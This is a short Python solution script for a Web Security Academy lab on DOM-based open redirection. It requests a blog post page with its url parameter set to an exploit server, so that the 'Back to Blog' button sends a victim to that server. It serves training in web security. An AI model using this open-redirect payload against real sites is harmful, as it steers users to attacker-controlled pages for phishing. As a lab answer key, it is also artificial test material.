#################################################################
#
# Lab: DOM-based open redirection
#
# Hack Steps:
#      1. Fetching a post page with the url parameter set to
#         the exploit server
#      2. The victim will be redirected to the exploit server
#         when clicking on the Back to Blog button
#
#################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a770099039af9d88072171400420099.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a0100a7032bf930808016da01f30065.exploit-server.net"

def main():
    print("❯❯ Fetching a post page with the url parameter set to the exploit server.. ", end="", flush=True)
    
    try:
        requests.get(f"{LAB_URL}/post?postId=1&url={EXPLOIT_SERVER_URL}")

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim will be redirected to the exploit server when clicking on the Back to Blog button")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


